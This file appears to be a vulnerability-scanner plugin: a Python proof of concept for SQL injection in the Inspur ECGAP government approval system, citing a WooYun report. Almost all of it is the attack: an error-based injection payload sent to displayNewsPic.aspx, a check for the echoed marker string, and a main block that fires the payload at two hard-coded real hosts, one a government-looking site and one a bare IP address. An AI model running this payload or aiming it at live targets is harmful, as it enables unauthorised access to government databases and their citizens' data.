#!/usr/bin/evn python
#-*-:coding:utf-8 -*-
#Author:404
#Name:浪潮ECGAP政务审批系统SQL注入漏洞
#Refer:http://www.wooyun.org/bugs/wooyun-2010-075562


def assign(service,arg):
    if service=="lcecgap":
        return True,arg 


def  audit(arg):
    url=arg+"Broadcast/displayNewsPic.aspx?id=00187/**/and/**/1=convert(int,char(71)%2Bchar(65)%2Bchar(79)%2Bchar(74)%2Bchar(73))"
    code,head,res,errcode,_=curl.curl2(url)
    if code==500 and 'GAOJI' in res:
        security_hole(url)
if __name__=="__main__":
    from dummy import *
    audit(assign('lcecgap','http://www.lcxz.cn/liaochengwaiwang/')[1])
    audit(assign('lcecgap','http://111.63.13.179/')[1])